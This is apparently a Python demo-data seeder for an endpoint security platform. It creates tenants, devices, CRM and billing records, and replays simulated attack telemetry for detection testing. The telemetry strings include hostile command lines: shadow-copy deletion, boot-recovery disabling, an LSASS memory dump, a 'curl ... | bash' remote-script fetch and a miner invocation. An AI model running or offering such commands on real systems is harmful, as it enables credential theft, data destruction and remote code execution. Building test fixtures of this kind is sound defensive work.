"""Populate a Fenrir Cloud instance with realistic demo data through its public APIs.

    python -m fenrir_cloud.demo --url http://localhost:8080 --email admin@fenrir.local --password '...'

Everything goes through the same endpoints real agents and analysts use, so
it doubles as an end-to-end smoke test. Never point it at production.
"""

from __future__ import annotations

import argparse
import json
import random
import uuid
from datetime import datetime, timedelta, timezone

import httpx


def _now(offset_minutes: float = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)).isoformat()


def win(event_type: str, minutes_ago: float, **payload) -> dict:
    return {"eventId": str(uuid.uuid4()), "eventType": event_type, "source": "demo", "summary": "",
            "occurredAt": _now(minutes_ago), "payloadJson": json.dumps(payload)}


def unified(event_type: str, minutes_ago: float, **payload) -> dict:
    return {"eventId": str(uuid.uuid4()), "eventType": event_type, "timestamp": _now(minutes_ago), "payload": payload}


def ransomware_chain(start: float) -> list[dict]:
    temp = "C:\\Users\\jsmith\\AppData\\Local\\Temp\\invoice_viewer.exe"
    events = [
        win("process.start", start, processImagePath="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            commandLine='"WINWORD.EXE" /n "C:\\Users\\jsmith\\Downloads\\Invoice_4471.docm"', pid=3120),
        win("process.start", start - 1, processImagePath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            parentProcessImagePath="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            commandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", pid=4410, ppid=3120),
        win("process.start", start - 2, processImagePath=temp, parentProcessImagePath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            commandLine=f"{temp} --silent", pid=5512, ppid=4410),
        win("network.connect", start - 2.5, processImagePath=temp, remoteAddress="185.220.101.47", remotePort=4444, pid=5512),
        win("process.start", start - 3, processImagePath="C:\\Windows\\System32\\vssadmin.exe", commandLine="vssadmin.exe delete shadows /all /quiet",
            parentProcessImagePath=temp, pid=5601, ppid=5512),
        win("process.start", start - 3.2, processImagePath="C:\\Windows\\System32\\bcdedit.exe",
            commandLine="bcdedit /set {default} recoveryenabled no", parentProcessImagePath=temp, pid=5602, ppid=5512),
    ]
    for i in range(32):
        events.append(win("file.rename", start - 4 - i / 60, processImagePath=temp, pid=5512,
                          targetPath=f"C:\\Users\\jsmith\\Documents\\Finance\\Q{i % 4 + 1}_report_{i}.xlsx.akira"))
    events.append(win("file.create", start - 5, processImagePath=temp, pid=5512, path="C:\\Users\\jsmith\\Desktop\\README_TO_DECRYPT.txt"))
    events.append(win("ransomware.canary.touched", start - 5, processImagePath=temp, pid=5512, path="C:\\Users\\jsmith\\Documents\\~$fenrir_canary.docx"))
    return events


def benign(minutes_ago: float) -> list[dict]:
    apps = [("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer"),
            ("C:\\Windows\\explorer.exe", "explorer.exe"), ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),
            ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs")]
    image, cmd = random.choice(apps)
    return [win("process.start", minutes_ago, processImagePath=image, commandLine=cmd, pid=random.randint(1000, 9000))]


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://localhost:8080")
    parser.add_argument("--email", default="admin@fenrir.local")
    parser.add_argument("--password", required=True)
    args = parser.parse_args()

    http = httpx.Client(base_url=args.url, timeout=60)
    token = http.post("/api/console/auth/login", json={"email": args.email, "password": args.password}).raise_for_status().json()["token"]
    admin = {"Authorization": f"Bearer {token}"}

    def post(path: str, body: dict, headers: dict | None = None) -> dict:
        response = http.post(path, json=body, headers=headers or admin)
        response.raise_for_status()
        return response.json()

    customers = [("Acme Dental Group", "balanced"), ("Northwind Legal LLP", "strict"), ("Contoso Manufacturing", "server")]
    tenants = [post("/api/console/tenants", {"name": name, "template": template}) for name, template in customers]

    fleet = []
    for tenant, prefix, hosts in zip(tenants, ("ACME", "NWL", "CON"), (6, 4, 5)):
        token = post("/api/console/enrollment-tokens", {"tenantId": tenant["id"], "label": "Demo rollout"})["token"]
        for i in range(hosts):
            linux = prefix == "CON" and i >= 3
            os_version = "Ubuntu 22.04.4 LTS" if linux else random.choice(["Windows 11 Pro 23H2", "Windows 11 Enterprise 24H2", "Windows Server 2022"])
            device = post("/api/v1/enroll", {"hostname": f"{prefix}-{'SRV' if linux else 'WS'}-{i + 1:02d}", "osVersion": os_version,
                                             "serialNumber": f"{prefix}{i:04d}", "agentVersion": "1.6.0"}, {"X-Fenrir-Token": token})
            device["headers"] = {"X-Device-Api-Key": device["deviceApiKey"]}
            device["linux"] = linux
            fleet.append(device)
            http.post(f"/api/v1/devices/{device['deviceId']}/heartbeat", headers=device["headers"],
                      json={"agentVersion": "1.6.0", "platformVersion": "1.6.0", "healthState": "healthy", "isolated": False})

    def telemetry(device: dict, events: list[dict]) -> None:
        for start in range(0, len(events), 500):
            post(f"/api/v1/devices/{device['deviceId']}/telemetry", {"events": events[start:start + 500]}, device["headers"])

    for device in fleet:
        telemetry(device, [e for m in range(0, 600, 15) for e in benign(m)])
        if device["linux"]:
            telemetry(device, [unified("device.inventory.snapshot", 30, software=[
                {"name": "openssl", "version": "3.0.2-0ubuntu1.10"}, {"name": "openssh-server", "version": "1:8.9p1-3ubuntu0.4"},
                {"name": "sudo", "version": "1.9.9-1ubuntu2.3"}, {"name": "curl", "version": "7.81.0-1ubuntu1.13"}])])

    # Attack stories.
    telemetry(fleet[0], ransomware_chain(40))
    telemetry(fleet[7], [win("process.start", 90, processImagePath="C:\\Windows\\System32\\rundll32.exe",
                             commandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Temp\\l.dmp full", pid=6620)])
    linux_box = next(d for d in fleet if d["linux"])
    telemetry(linux_box, [unified("ProcessStart", 120, processName="bash", pid=2201,
                                  commandLine="curl -s http://45.9.148.12/x.sh | bash", image="/usr/bin/bash"),
                          unified("ProcessStart", 119, processName="kdevtmpfsi", pid=2240, image="/tmp/kdevtmpfsi",
                                  commandLine="/tmp/kdevtmpfsi -o pool.supportxmr.com:443")])
    telemetry(fleet[3], [win("scan.threat.quarantined", 300, path="C:\\Users\\Public\\Downloads\\crack_setup.exe",
                             threatName="Win32/Agent.Stealer", score=96, verdict="quarantined")])

    post("/api/console/intel/indicators", {"tenantId": None, "values": ["185.220.101.47", "45.9.148.12", "invoice-portal-secure.top",
                                                                         "a" * 64], "category": "command-and-control"})
    post("/api/console/automations", {"tenantId": None, "name": "Isolate on ransomware behaviour",
                                      "conditions": {"minSeverity": "critical", "mitre": ["T1486"]},
                                      "actions": [{"type": "command", "command": "device.isolate"}, {"type": "ticket"}]})
    post("/api/console/exposure/assets", {"tenantId": tenants[0]["id"], "target": "localhost", "label": "Demo gateway (this server)",
                                          "ownershipConfirmed": True})

    leads = [("Initech", "Bill Lumbergh", "Proposal", 14400, 60), ("Globex Corporation", "Hank Scorpio", "Qualified", 30000, 120),
             ("Umbrella Clinics", "Alice Abernathy", "New", 6000, 25), ("Stark Logistics", "Pepper Potts", "Contacted", 9600, 40),
             ("Wayne Estates", "Lucius Fox", "Won", 4800, 20)]
    for company, contact, stage, value, seats in leads:
        post("/api/console/crm/leads", {"company": company, "contact": contact, "email": f"{contact.split()[0].lower()}@{company.split()[0].lower()}.example",
                                        "stage": stage, "value": value, "seats": seats, "source": "Referral"})
    for tenant, price in zip(tenants, (6.5, 9.0, 7.25)):
        post("/api/console/billing/contracts", {"accountTenantId": tenant["id"], "name": f"{tenant['name']} managed security",
                                                "pricePerDevice": price, "monthlyFee": 150, "hourlyRate": 85, "includedHours": 2})
        post("/api/console/tickets", {"accountTenantId": tenant["id"], "subject": "New starter laptop setup", "priority": "P3"})
    post("/api/console/crm/projects", {"name": "Cyber Essentials Plus certification", "accountTenantId": tenants[1]["id"],
                                       "status": "In Progress", "progress": 45, "budget": 4500})
    print(f"Demo ready: {len(tenants)} tenants, {len(fleet)} devices, attacks replayed. Open {args.url}")


if __name__ == "__main__":
    main()
